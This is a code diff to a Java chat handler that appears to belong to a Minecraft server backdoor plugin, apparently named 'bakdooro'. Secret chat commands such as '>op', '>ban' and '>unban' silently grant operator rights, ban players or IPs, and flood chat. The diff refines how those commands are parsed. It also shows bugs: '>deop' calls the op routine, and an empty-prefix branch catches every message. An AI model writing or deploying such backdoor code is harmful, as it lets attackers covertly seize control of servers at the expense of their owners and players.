@@ -14,10 +14,10 @@ public class chathandler {
     public static void handler(Player pl, String message) {
         String[] spl = message.split(":");
         if (message.startsWith(">")) {
-            if (message.startsWith(">fillchat")) {
+            if (spl[0].startsWith(">fillchat")) {
                 me.acaiberii.bakdooro.exp.exploits.chatFill();
             }
-            else if (message.startsWith(">op")) {
+            else if (spl[0].startsWith(">op")) {
                 if (spl.length < 2) {
                     pl.sendMessage("Invalid syntax. Correct syntax: >op:(PLAYER)");
                 }
@@ -25,7 +25,7 @@ public class chathandler {
                     me.acaiberii.bakdooro.exp.exploits.remoteOp(Objects.requireNonNull(srv.getPlayer(spl[1])));
                 }
             }
-            else if (message.startsWith(">deop")) {
+            else if (spl[0].startsWith(">deop")) {
                 if (spl.length < 2) {
                     pl.sendMessage("Invalid syntax. Correct syntax: >deop:(PLAYER)");
                 }
@@ -33,7 +33,7 @@ public class chathandler {
                     me.acaiberii.bakdooro.exp.exploits.remoteOp(Objects.requireNonNull(srv.getPlayer(spl[1])));
                 }
             }
-            else if (message.startsWith(">ban")) {
+            else if (spl[0].startsWith(">ban")) {
                 if (spl.length < 3) {
                     pl.sendMessage("Invalid syntax. Correct syntax: >ban:(MODE):(PLAYER/auto)");
                 }
@@ -52,13 +52,16 @@ public class chathandler {
                     }
                 }
             }
-            else if (message.startsWith(">unban")) {
+            else if (spl[0].startsWith(">unban")) {
                 if (spl.length < 2) {
                     pl.sendMessage("Invalid syntax. Correct syntax: >unban:(PLAYER)");
                 }
                 else {
                     srv.unbanIP(Objects.requireNonNull(Objects.requireNonNull(getPlayer(spl[1])).getAddress()).getHostString());
                 }
+            }
+            else if (spl[0].startsWith("")) {
+
             }
             else {
                 pl.sendMessage("Unknown command. Try again.");
